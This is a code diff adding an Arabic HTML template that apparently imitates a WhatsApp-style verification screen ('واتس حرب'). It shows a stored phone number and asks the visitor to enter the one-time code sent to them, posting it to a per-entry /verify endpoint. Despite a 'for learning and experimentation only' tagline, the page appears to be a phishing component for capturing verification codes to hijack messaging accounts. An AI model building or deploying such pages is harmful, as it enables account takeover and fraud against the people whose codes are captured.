@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>واتس حرب</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body class="mobile-page">
+  <main class="phone-shell">
+    <div class="status-bar">
+      <span>9:41</span>
+      <div class="notch"></div>
+      <div class="icons">
+        <span>▮▮▮</span>
+        <span>◔</span>
+        <span>▭</span>
+      </div>
+    </div>
+
+    <section class="mobile-header simple">
+      <h1>واتس حرب</h1>
+      <p>للتعلّم والتجريب فقط</p>
+    </section>
+
+    <section class="white-card">
+      <h2>أدخل رمز التحقق</h2>
+      <p class="sub">أدخل الرمز المرسل إليك</p>
+
+      {% if request.query_params.get("error") %}
+      <div class="error-box">يرجى إدخال الرمز.</div>
+      {% endif %}
+
+      <div class="info-row">
+        <span class="icon">☏</span>
+        <span>+{{ entry.country_code }} {{ entry.phone }}</span>
+      </div>
+
+      <form action="/verify/{{ entry.id }}" method="post" class="stack">
+        <div class="otp-grid">
+          <input class="otp-input" type="text" name="code" maxlength="6" placeholder="" required>
+        </div>
+        <button class="green-btn" type="submit">تحقق</button>
+      </form>
+    </section>
+
+    <div class="wave"></div>
+    <div class="home-indicator"></div>
+  </main>
+</body>
+</html>
